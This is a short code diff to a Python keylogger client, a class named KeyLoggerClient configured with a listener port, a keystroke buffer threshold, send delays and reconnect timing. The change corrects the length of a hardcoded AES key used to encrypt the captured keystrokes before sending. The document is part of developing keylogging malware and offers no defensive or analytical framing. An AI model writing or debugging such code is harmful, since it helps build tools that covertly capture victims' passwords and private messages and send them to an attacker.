@@ -14,7 +14,7 @@ PORT = 4445
 BUFFER_THRESHOLD = 20  # Characters before sending
 MAX_DELAY = 2.0  # Maximum seconds between sends
 RECONNECT_BASE_DELAY = 1.0
-ENCRYPTION_KEY = b'This-is-a-32-byte-AES-key-1234!'  # 32 characters = 32 bytes
+ENCRYPTION_KEY = b'This-is-a-32-byte-AES-key-1234!!'  # 32 characters = 32 bytes
 
 class KeyLoggerClient:
     def __init__(self):
